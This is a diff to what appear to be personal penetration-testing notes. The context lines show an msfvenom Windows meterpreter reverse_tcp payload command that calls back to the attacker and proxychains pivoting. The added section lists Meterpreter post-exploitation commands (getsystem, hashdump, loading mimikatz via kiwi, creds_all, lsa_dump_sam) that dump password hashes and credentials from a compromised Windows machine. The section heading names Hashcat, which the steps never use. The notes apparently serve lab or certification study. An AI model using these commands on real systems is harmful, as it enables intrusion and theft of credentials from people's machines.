@@ -197,3 +197,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT
   `1      192.168.3.28:443  0.0.0.0:1234  Reverse`
 - BindAddress can stay at 0.0.0.0, BindPort should be 443, connectPort should be 1234 and connect address is the ip of our victime machine.
 - We should now be able to reach other machine in the network of the initial machine that has now route to our attacking machine using proxychains
+
+## Dump hashes with Hashcat
+
+- We should have a session
+- We can check our privileges using `run post/windows/gather/win_privs`
+- We can get getsystem if not already using `getsystem and to check it worked we can use `getuid`
+- `hashdump` will dump the hashes on the machine *Note when the hash ends with `0c089c0` it usually means that the account is probably disabled`
+- `load kiwi` will load mimikatz within meterpreter
+- `creds_all`
+- `lsa_dump_sam` will dump hashes from the sam file
